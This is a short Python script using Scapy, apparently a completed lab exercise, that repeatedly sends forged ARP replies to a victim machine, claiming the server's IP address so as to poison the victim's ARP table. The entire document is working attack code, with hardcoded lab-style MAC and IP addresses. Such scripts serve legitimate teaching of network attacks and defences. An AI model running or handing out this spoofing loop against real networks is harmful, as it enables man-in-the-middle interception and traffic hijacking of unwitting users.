from scapy.all import *
import time

ATTACKER_MAC = "02:42:c0:a8:65:14"
VICTIM_MAC = "02:42:c0:a8:65:0a"
SERVER_IP = "192.168.101.30"

# Complete the script
broadcast = Ether(dst=VICTIM_MAC)

while True:
    print("Sending malicious ARP packets")

    # Craft a malicious ARP packet to poison the victim ARP table to >
    arp = ARP(op=2, hwdst=VICTIM_MAC, psrc=SERVER_IP)
    sendp(broadcast / arp, verbose= False)
    time.sleep(1)

